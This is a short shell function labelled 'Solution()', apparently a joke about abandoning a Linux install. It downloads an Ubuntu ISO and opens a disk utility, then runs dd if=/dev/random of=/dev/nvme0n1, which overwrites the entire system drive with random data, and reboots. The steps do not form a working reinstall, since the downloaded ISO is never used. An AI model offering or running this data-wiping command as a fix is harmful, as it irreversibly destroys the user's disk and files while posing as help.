`Solution(){
	sudo su
	wget -c https://releases.ubuntu.com/24.10/ubuntu-24.10-desktop-amd64.iso
	pacman -Sy gnome-disk-utility
	gnome-disks
	# Restore Disk Image
	lsblk
	my=nvme0n1
	dd if=/dev/random of=/dev/$my

	echo "Never again!"
	reboot
}`
